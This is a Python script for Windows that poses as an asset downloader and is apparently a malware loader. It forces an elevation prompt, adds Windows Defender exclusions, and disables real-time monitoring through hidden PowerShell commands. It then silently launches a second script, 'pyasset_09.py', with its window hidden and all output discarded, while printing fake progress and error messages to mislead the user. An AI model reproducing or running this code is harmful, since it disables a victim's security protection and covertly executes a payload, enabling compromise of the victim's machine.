import subprocess
import time
import os
import sys
import ctypes
import platform
import ctypes.wintypes

if platform.system() != "Windows":
    print("Incompatible OS, Windows only.")
    sys.exit()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
        sys.exit()

def add_defender_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{path}\\""'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
    except:
        pass

def disable_defender_realtime():
    try:
        cmd = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
    except:
        pass

def main():
    run_as_admin()
    current_script = os.path.abspath(sys.argv[0])
    target_script = os.path.join("assets", "py", "pyasset_09.py")
    add_defender_exclusion(current_script)
    add_defender_exclusion(target_script)
    disable_defender_realtime()
    print("Downloading assets...")
    CREATE_NO_WINDOW = 0x08000000
    subprocess.Popen(
        [sys.executable, target_script],
        creationflags=CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        close_fds=True,
        shell=False
    )
    time.sleep(1.8)
    print("Collecting assets...")
    time.sleep(4.20)
    print("Inflating assets")
    time.sleep(2.8)
    print("Error occured... Attempting to automatically resolve.")
    time.sleep(7)
    print("Successfully resolved error. Please wait...")
    time.sleep(4)
    print("Recollecting assets...")
    time.sleep(2)
    print("Reusing 14 / 23 cached assets")
    time.sleep(30)
    print("Failed to download assets.")

if __name__ == "__main__":
    main()
